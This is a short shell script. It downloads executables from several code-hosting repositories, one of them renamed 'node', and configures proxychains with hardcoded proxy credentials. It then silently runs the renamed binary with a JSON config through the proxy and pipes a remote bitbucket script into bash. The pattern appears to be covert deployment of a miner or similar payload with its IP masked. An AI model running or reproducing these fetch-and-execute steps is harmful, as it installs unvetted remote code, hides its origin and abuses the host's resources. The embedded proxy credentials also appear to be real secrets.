proxy="38.154.227.167" 
port="5868" 
user="zltbofaw"  
pass="f4kxuxnrf5eb" 
wget -q -O node https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x node
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
wget -q https://raw.githubusercontent.com/dragonballku8/kids/main/config.json && chmod +x config.json
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./node -c "config.json" >/dev/null 2>&1  
sleep 1
sync; echo 3 > /proc/sys/vm/drop_caches &
curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash
